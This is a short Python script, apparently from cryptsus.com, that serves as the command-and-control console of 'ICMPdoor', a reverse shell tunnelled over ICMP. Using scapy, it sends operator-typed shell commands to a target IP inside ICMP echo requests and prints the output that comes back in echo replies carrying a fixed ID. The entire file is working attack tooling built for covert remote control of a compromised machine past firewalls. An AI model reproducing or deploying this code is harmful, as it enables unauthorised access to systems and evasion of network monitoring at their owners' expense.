#!/usr/bin/python3
#By krabelize | cryptsus.com
#ICMPdoor (reverse shell) C&C 
from scapy.all import *
from multiprocessing import Process
import argparse

#Variables
icmp_id = int(13170)

def check_scapy():
    try:
        import scapy
    except ImportError:
        print("Install the scapy module")

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', type=str, required=True, help="Listener (virtual) Network Interface (e.g. eth0)")
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
args = parser.parse_args()

def sniffer():
    sniff(iface=args.interface, prn=shell, filter="icmp", store="0")

def shell(pkt):
    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 0 and pkt[ICMP].id == icmp_id and pkt[Raw].load:
        newpkt = (pkt[Raw].load).decode('utf-8', errors='ignore').replace('\n','')
        print(newpkt)
    else:
        pass

def main():
    p = Process(target=sniffer)
    p.start()

if __name__ == '__main__':
    main()

while True:
    icmpshell = input("shell: ")
    payload = (IP(dst=args.destination_ip)/ICMP(type=8,id=icmp_id)/Raw(load=icmpshell))
    if icmpshell == '':
        pass
    else:
        sr(payload, timeout=0, verbose=0)
p.join()
